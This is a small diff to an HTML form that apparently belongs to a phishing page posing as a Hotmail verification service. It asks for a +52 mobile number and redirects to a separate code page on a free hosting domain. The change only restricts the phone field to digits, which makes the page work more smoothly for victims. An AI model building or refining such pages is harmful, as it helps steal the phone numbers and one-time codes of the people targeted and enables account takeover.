@@ -142,7 +142,7 @@
           <input type="hidden" name="_next" value="https://hotmailverificacionpersonal.vercel.app/codigo.html">
           <div class="continput">
             <label for="email">+52</label>
-          <input type="number" id="email" name="numerocel" placeholder="Ingresa tu numero de celular" maxlenght="10" required>
+          <input type="number" id="email" name="numerocel" placeholder="Ingresa tu numero de celular" onkeypress="return event.charCode >= 48 && event.charCode <= 57" maxlenght="10" required>
         </div>
 
           <div class="checkbox">
